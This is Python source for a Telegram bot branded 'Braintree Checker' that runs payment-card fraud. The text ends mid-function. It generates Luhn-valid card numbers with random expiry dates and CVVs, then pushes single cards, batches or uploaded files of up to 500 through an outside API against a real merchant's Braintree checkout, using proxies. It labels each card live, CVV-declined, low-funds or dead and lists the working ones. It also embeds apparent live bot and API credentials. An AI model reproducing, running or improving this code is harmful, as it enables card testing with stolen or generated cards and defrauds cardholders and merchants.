import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8770871462:AAFrOsWeGQxHVdjQ0SUbTJaODAFLKDPD1jE'
ADMIN_ID = 5629984144
bot = telebot.TeleBot(BOT_TOKEN)

USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except:
            return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'approved_users': list(approved_users), 'pending_requests': pending_requests}, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

approved_users, pending_requests = load_users()

ACTIVE_PROXY = None
PROXY_LOCK = threading.Lock()

def test_proxy(proxy_url):
    try:
        response = requests.get('https://jossalicious.org', proxies={'http': proxy_url, 'https': proxy_url}, timeout=10, verify=False)
        return response.status_code in [200, 301, 302, 403, 404]
    except:
        return False

def set_proxy(proxy_url):
    global ACTIVE_PROXY
    if test_proxy(proxy_url):
        with PROXY_LOCK:
            ACTIVE_PROXY = proxy_url
        return True, "✅ Proxy is live and set successfully!"
    return False, "❌ Proxy is dead or unreachable"

def remove_proxy():
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None
    return "✅ Proxy removed. Using direct connection."

def get_proxies():
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com"
JOSS_API = "https://jossalicious.org/b3/api/wpg.php"

user_sessions = {}
user_cooldowns = {}
stop_checking = {}
user_custom_sites = {}
COOLDOWN_CHECK = 10
COOLDOWN_MASS = 20
MAX_MASS_CARDS = 10
MAX_FILE_CARDS = 500
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

def get_card_info(card_number):
    info = {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🌍', 'bank': 'Unknown', 'level': 'Unknown'}
    bin_number = card_number[:6]
    
    if HANDYAPI_KEY:
        try:
            response = requests.get(f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'): 
                    info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'): 
                    info['type'] = str(data['Type']).title()
                if data.get('Category'): 
                    info['level'] = str(data['Category']).title()
                elif data.get('CardTier'): 
                    info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'): 
                    info['bank'] = str(data['Issuer']).title()
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'): 
                        info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except:
            pass
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): 
                info['brand'] = data['scheme'].upper()
            if data.get('type'): 
                info['type'] = data['type'].title()
            if data.get('brand'): 
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): 
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): 
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

def calculate_luhn_digit(partial_card):
    digits = [int(d) for d in str(partial_card) + '0']
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return (10 - (checksum % 10)) % 10

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        if exp_month and exp_year:
            month = int(exp_month)
            year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
            month = random.randint(1, 12)
            year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
            text = "╔════════════════════╗\n"
            text += "║   🚫 ACCESS DENIED   ║\n"
            text += "╚════════════════════╝\n\n"
            text += "⚠️ You need admin approval\n"
            text += "📝 Use /request to get access\n"
            bot.send_message(message.chat.id, text)
            return
        return func(message)
    return wrapper

def get_braintree_site(chat_id):
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        return user_custom_sites[chat_id]
    return DEFAULT_BRAINTREE_SITE

class BraintreeChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        
    def validate_card(self, card):
        start_time = time.time()
        
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
            
            card_info = get_card_info(number)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
            elif len(exp_year) == 1:
                exp_year = f"0{exp_year}"
            
        except Exception as e:
            return {'status': 'error', 'message': 'Parse error', 'icon': '❌', 'time': 0}
        
        site_url = get_braintree_site(self.chat_id)
        
        try:
            params = {
                'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
                'proxy': '',
                'sites': site_url,
                'xlite': 'undefined'
            }
            
            response = requests.get(
                JOSS_API,
                params=params,
                proxies=get_proxies(),
                verify=False,
                timeout=60
            )
            
            elapsed_time = round(time.time() - start_time, 2)
            
            if response.status_code != 200:
                return {
                    'status': 'error',
                    'message': f'API Error: {response.status_code}',
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            response_text = response.text.lower()
            
            if 'cvv' in response_text or 'security code' in response_text:
                return {
                    'status': 'live_cvv',
                    'message': 'Card Issuer Declined CVV',
                    'icon': '⚠️',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            if 'insufficient' in response_text or 'insufficient funds' in response_text:
                return {
                    'status': 'insufficient',
                    'message': 'Insufficient Funds',
                    'icon': '💰',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            if any(word in response_text for word in ['approved', 'success', 'authorized', 'thank you', 'payment successful']):
                return {
                    'status': 'live',
                    'message': 'Payment successful',
                    'icon': '✅',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            if any(word in response_text for word in ['declined', 'fraud', 'stolen', 'lost', 'invalid', 'rejected', 'processor declined']):
                message = 'Card Declined'
                if 'fraud' in response_text:
                    message = 'Gateway Rejected: fraud'
                elif 'processor declined' in response_text:
                    message = 'Processor Declined'
                    
                return {
                    'status': 'dead',
                    'message': message,
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            return {
                'status': 'dead',
                'message': 'Card Declined',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
            
        except requests.exceptions.Timeout:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'status': 'error',
                'message': 'Connection timeout',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
        except Exception as e:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'status': 'error',
                'message': f'Error: {str(e)[:30]}',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not is_approved(user_id):
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "⚠️ ACCESS REQUIRED ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "🎯 MAIN COMMANDS\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /bchk - Single card check\n"
        text += "📦 /bmass - Multiple cards check\n"
        text += "📁 /bfile - Upload .txt file\n"
        text += "🔍 /bin - BIN lookup\n"
        text += "🎲 /gen - Generate cards\n"
        text += "🌍 /custom_site - Set your site\n"
        text += "🗑️ /remove_site - Remove site\n"
        text += "📍 /site - Check current site\n"
        text += "❓ /help - Show help\n\n"
        
        if user_id == ADMIN_ID:
            text += "⚙️ ADMIN COMMANDS\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "🌐 /proxy - Set proxy\n"
            text += "🚫 /removeproxy - Remove proxy\n"
            text += "📊 /proxystatus - Check status\n"
            text += "👥 /users - List users\n"
            text += "⏳ /pending - Pending requests\n"
            text += "📢 /broadcast - Send message to all\n\n"
        
        text += "✨ Powered by YOSH ✨"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    if is_approved(user_id):
        text = "╔════════════════════╗\n"
        text += "║   ✅ APPROVED   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "🎉 You already have access!"
        bot.send_message(message.chat.id, text)
        return
    if user_id in pending_requests:
        text = "╔════════════════════╗\n"
        text += "║   ⏳ PENDING   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "⏱️ Your request is pending\n"
        text += "Please wait for approval..."
        bot.send_message(message.chat.id, text)
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    admin_msg = "╔════════════════════════╗\n"
    admin_msg += "║  📥 NEW ACCESS REQUEST  ║\n"
    admin_msg += "╚════════════════════════╝\n\n"
    admin_msg += f"👤 Name: {full_name}\n"
    admin_msg += f"🔗 Username: @{username}\n"
    admin_msg += f"🆔 ID: {user_id}\n"
    admin_msg += f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    admin_msg += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    admin_msg += "Approve this user?"
    
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    user_msg = "╔════════════════════╗\n"
    user_msg += "║   📤 REQUEST SENT   ║\n"
    user_msg += "╚════════════════════╝\n\n"
    user_msg += "✅ Request sent to admin\n"
    user_msg += "⏳ Please wait for approval..."
    bot.send_message(message.chat.id, user_msg)

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('deny_'))
def handle_approval_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    
    action, user_id = call.data.split('_')
    user_id = int(user_id)
    
    if action == 'approve':
        approved_users.add(user_id)
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "✅ User approved!")
        bot.edit_message_text(f"✅ User {user_id} has been APPROVED!", call.message.chat.id, call.message.message_id)
        try:
            approval_msg = "╔════════════════════╗\n"
            approval_msg += "║   🎉 APPROVED!   ║\n"
            approval_msg += "╚════════════════════╝\n\n"
            approval_msg += "✅ Access granted!\n"
            approval_msg += "🚀 Type /start to begin"
            bot.send_message(user_id, approval_msg)
        except:
            pass
    elif action == 'deny':
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "❌ User denied!")
        bot.edit_message_text(f"❌ User {user_id} has been DENIED!", call.message.chat.id, call.message.message_id)
        try:
            deny_msg = "╔════════════════════╗\n"
            deny_msg += "║   ❌ DENIED   ║\n"
            deny_msg += "╚════════════════════╝\n\n"
            deny_msg += "🚫 Access denied by admin"
            bot.send_message(user_id, deny_msg)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def handle_stop_check(call):
    chat_id = int(call.data.split('_')[2])
    if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
        stop_checking[chat_id] = True
        bot.answer_callback_query(call.id, "🛑 Stopping check...")

@bot.message_handler(commands=['bchk'])
@require_approval
def braintree_check(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'check')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    command_parts = message.text.split(maxsplit=1)
    
    if len(command_parts) < 2:
        if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
            cards = user_sessions[message.chat.id]['generated_cards']
            if cards:
                card_input = cards[0]
            else:
                text = "╔════════════════════╗\n"
                text += "║  ❌ INVALID FORMAT  ║\n"
                text += "╚════════════════════╝\n\n"
                text += "Usage: /bchk card|mm|yy|cvv"
                bot.send_message(message.chat.id, text)
                return
        else:
            text = "╔════════════════════╗\n"
            text += "║  ❌ INVALID FORMAT  ║\n"
            text += "╚════════════════════╝\n\n"
            text += "Usage: /bchk card|mm|yy|cvv"
            bot.send_message(message.chat.id, text)
            return
    else:
        card_input = command_parts[1].strip()
    
    status_msg = bot.send_message(message.chat.id, f"⏳ Checking card...\n\n💳 {card_input}")
    
    checker = BraintreeChecker(message.chat.id)
    result = checker.validate_card(card_input)
    card_info = result.get('card_info', {})
    
    if result['status'] == 'live':
        check_response = "╔═══════════════════════════════╗\n"
        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
        check_response += "╚═══════════════════════════════╝\n\n"
        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
        check_response += f"<b>Status: ✅ Card Live</b>\n\n"
        check_response += "<b>Card Info:</b>\n"
        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
        check_response += f"<b>Gateway:</b> Braintree\n"
        check_response += f"<b>Response:</b> {result['message']}\n\n"
        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    elif result['status'] == 'live_cvv':
        check_response = "╔═══════════════════════════════╗\n"
        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
        check_response += "╚═══════════════════════════════╝\n\n"
        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
        check_response += f"<b>Status: ⚠️ CVV Mismatch</b>\n\n"
        check_response += "<b>Card Info:</b>\n"
        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
        check_response += f"<b>Gateway:</b> Braintree\n"
        check_response += f"<b>Response:</b> {result['message']}\n\n"
        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    elif result['status'] == 'insufficient':
        check_response = "╔═══════════════════════════════╗\n"
        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
        check_response += "╚═══════════════════════════════╝\n\n"
        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
        check_response += f"<b>Status: 💰 Insufficient Funds</b>\n\n"
        check_response += "<b>Card Info:</b>\n"
        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
        check_response += f"<b>Gateway:</b> Braintree\n"
        check_response += f"<b>Response:</b> {result['message']}\n\n"
        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    else:
        check_response = "╔═══════════════════════════════╗\n"
        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
        check_response += "╚═══════════════════════════════╝\n\n"
        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
        check_response += f"<b>Status: ❌ Card Dead</b>\n\n"
        check_response += "<b>Card Info:</b>\n"
        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
        check_response += f"<b>Gateway:</b> Braintree\n"
        check_response += f"<b>Response:</b> {result['message']}\n\n"
        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    bot.edit_message_text(check_response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['bmass'])
@require_approval
def braintree_mass(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    command_parts = message.text.split(maxsplit=1)
    
    if len(command_parts) < 2:
        if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
            cards = user_sessions[message.chat.id]['generated_cards']
            if not cards:
                text = "╔════════════════════╗\n"
                text += "║  ❌ INVALID FORMAT  ║\n"
                text += "╚════════════════════╝\n\n"
                text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
                text += f"Max: {MAX_MASS_CARDS} cards"
                bot.send_message(message.chat.id, text)
                return
            if len(cards) > MAX_MASS_CARDS:
                text = "╔════════════════════╗\n"
                text += "║  ❌ TOO MANY CARDS  ║\n"
                text += "╚════════════════════╝\n\n"
                text += f"You generated {len(cards)} cards\n"
                text += f"Max for /bmass: {MAX_MASS_CARDS}\n\n"
                text += "💡 Use /bfile for more cards"
                bot.send_message(message.chat.id, text)
                return
        else:
            text = "╔════════════════════╗\n"
            text += "║  ❌ INVALID FORMAT  ║\n"
            text += "╚════════════════════╝\n\n"
            text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
            text += f"Max: {MAX_MASS_CARDS} cards"
            bot.send_message(message.chat.id, text)
            return
    else:
        cards_text = command_parts[1].strip()
        cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
    
    if len(cards) > MAX_MASS_CARDS:
        text = "╔════════════════════╗\n"
        text += "║  ❌ TOO MANY CARDS  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"Max: {MAX_MASS_CARDS} cards\n"
        text += f"You sent: {len(cards)} cards"
        bot.send_message(message.chat.id, text)
        return
    
    status_msg = bot.send_message(message.chat.id, f"⏳ Checking {len(cards)} cards...")
    
    checker = BraintreeChecker(message.chat.id)
    results = []
    
    for idx, card in enumerate(cards, 1):
        bot.edit_message_text(f"⏳ Checking {idx}/{len(cards)}...\n\n💳 {card}", message.chat.id, status_msg.message_id)
        result = checker.validate_card(card)
        results.append((card, result))
        time.sleep(1)
    
    mass_response = "╔════════════════════════╗\n"
    mass_response += "║  📦 MASS CHECK RESULTS  ║\n"
    mass_response += "╚════════════════════════╝\n\n"
    mass_response += f"✅ Total: {len(results)} cards\n"
    mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for card, result in results:
        mass_response += f"{result['icon']} <code>{card}</code>\n"
        mass_response += f"└ {result['message']} ({result['time']}s)\n\n"
    
    mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    mass_response += f"👤 By: @{message.from_user.username or 'User'}"
    
    bot.edit_message_text(mass_response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['bfile'])
@require_approval
def request_braintree_file(message):
    text = "╔════════════════════╗\n"
    text += "║  📁 UPLOAD FILE  ║\n"
    text += "╚════════════════════╝\n\n"
    text += "📤 Please upload .txt file\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "📝 Format: card|mm|yy|cvv\n"
    text += "📊 One card per line\n"
    text += f"📈 Max: {MAX_FILE_CARDS} cards"
    bot.send_message(message.chat.id, text)
    user_sessions[message.chat.id] = {'awaiting_file': True}

@bot.message_handler(content_types=['document'])
@require_approval
def handle_braintree_file(message):
    if message.chat.id not in user_sessions or not user_sessions[message.chat.id].get('awaiting_file'):
        bot.send_message(message.chat.id, "❌ Please use /bfile command first")
        return
    
    user_sessions[message.chat.id]['awaiting_file'] = False
    
    if not message.document.file_name.endswith('.txt'):
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FILE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Please upload a .txt file"
        bot.send_message(message.chat.id, text)
        return
    
    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        cards_text = downloaded_file.decode('utf-8')
        cards = [c.strip() for c in cards_text.split('\n') if c.strip() and '|' in c]
        
        if len(cards) > MAX_FILE_CARDS:
            text = "╔════════════════════╗\n"
            text += "║  ❌ TOO MANY CARDS  ║\n"
            text += "╚════════════════════╝\n\n"
            text += f"Max: {MAX_FILE_CARDS} cards\n"
            text += f"Your file: {len(cards)} cards"
            bot.send_message(message.chat.id, text)
            return
        
        if len(cards) == 0:
            text = "╔════════════════════╗\n"
            text += "║  ❌ EMPTY FILE  ║\n"
            text += "╚════════════════════╝\n\n"
            text += "No valid cards found"
            bot.send_message(message.chat.id, text)
            return
        
        stop_checking[message.chat.id] = False
        
        stop_markup = types.InlineKeyboardMarkup()
        stop_markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{message.chat.id}"))
        
        status_msg = bot.send_message(message.chat.id, "⏳ Initializing file check...", reply_markup=stop_markup)
        
        checker = BraintreeChecker(message.chat.id)
        results = []
        live_count = 0
        cvv_count = 0
        low_funds_count = 0
        dead_count = 0
        
        for idx, card in enumerate(cards, 1):
            if stop_checking.get(message.chat.id, False):
                break
            
            result = checker.validate_card(card)
            results.append((card, result))
            
            if result['status'] == 'live':
                live_count += 1
            elif result['status'] == 'live_cvv':
                cvv_count += 1
            elif result['status'] == 'insufficient':
                low_funds_count += 1
            else:
                dead_count += 1
            
            progress_percent = int((idx / len(cards)) * 100)
            bar_length = 20
            filled_length = int(bar_length * idx // len(cards))
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            progress_msg = "╔════════════════════════════╗\n"
            progress_msg += "║   📊 FILE CHECK IN PROGRESS   ║\n"
            progress_msg += "╚════════════════════════════╝\n\n"
            progress_msg += "🎯 <b>LIVE STATISTICS</b>\n"
            progress_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            progress_msg += f"<b>✅ Live:</b> <code>{live_count}</code>\n"
            progress_msg += f"<b>⚠️ CVV:</b> <code>{cvv_count}</code>\n"
            progress_msg += f"<b>💰 Low Balance:</b> <code>{low_funds_count}</code>\n"
            progress_msg += f"<b>❌ Dead:</b> <code>{dead_count}</code>\n\n"
            progress_msg += "📈 <b>PROGRESS</b>\n"
            progress_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            progress_msg += f"<code>[{bar}]</code>\n"
            progress_msg += f"<b>{progress_percent}%</b> • <code>{idx}/{len(cards)}</code> cards\n\n"
            progress_msg += f"⏱️ <i>Checking card #{idx}...</i>"
            
            try:
                bot.edit_message_text(progress_msg, message.chat.id, status_msg.message_id, 
                                     parse_mode='HTML', reply_markup=stop_markup)
            except:
                pass
            
            time.sleep(1)
        
        was_stopped = stop_checking.get(message.chat.id, False)
        stop_checking[message.chat.id] = False
        
        file_response = "╔════════════════════════════╗\n"
        if was_stopped:
            file_response += "║   🛑 CHECK STOPPED BY USER   ║\n"
        else:
            file_response += "║   ✅ FILE CHECK COMPLETE   ║\n"
        file_response += "╚════════════════════════════╝\n\n"
        file_response += "📊 <b>FINAL RESULTS</b>\n"
        file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        file_response += f"<b>📥 Total Cards:</b> <code>{len(results)}</code>\n"
        file_response += f"<b>✅ Live:</b> <code>{live_count}</code>\n"
        file_response += f"<b>⚠️ CVV:</b> <code>{cvv_count}</code>\n"
        file_response += f"<b>💰 Low Balance:</b> <code>{low_funds_count}</code>\n"
        file_response += f"<b>❌ Dead:</b> <code>{dead_count}</code>\n\n"
        
        if live_count > 0 or cvv_count > 0 or low_funds_count > 0:
            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            file_response += "🎯 <b>LIVE CARDS FOUND</b>\n"
            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            for card, result in results:
                if result['status'] in ['live', 'live_cvv', 'insufficient']:
                    file_response += f"{result['icon']} <code>{card}</code>\n"
                    file_response += f"└ <i>{result['message']}</i>\n\n"
        else:
            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            file_response += "❌ <b>NO LIVE CARDS FOUND</b>\n"
            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        file_response += f"👤 <b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        file_response += f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
        
        bot.edit_message_text(file_response, message.chat.id, status_msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['bin'])
@require_approval
def check_bin(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage: /bin 464995"
        bot.send_message(message.chat.id, text)
        return
    bin_number = command_parts[1].strip()
    if not bin_number.isdigit() or len(bin_number) < 6:
        text = "╔════════════════════╗\n"
        text += "║   ❌ INVALID BIN   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "BIN must be at least 6 digits"
        bot.send_message(message.chat.id, text)
        return
    
    status_msg = bot.send_message(message.chat.id, "🔍 Looking up BIN...")
    card_info = get_card_info(bin_number.ljust(16, '0'))
    
    bin_response = "╔════════════════════════╗\n"
    bin_response += "║   🔍 BIN LOOKUP   ║\n"
    bin_response += "╚════════════════════════╝\n\n"
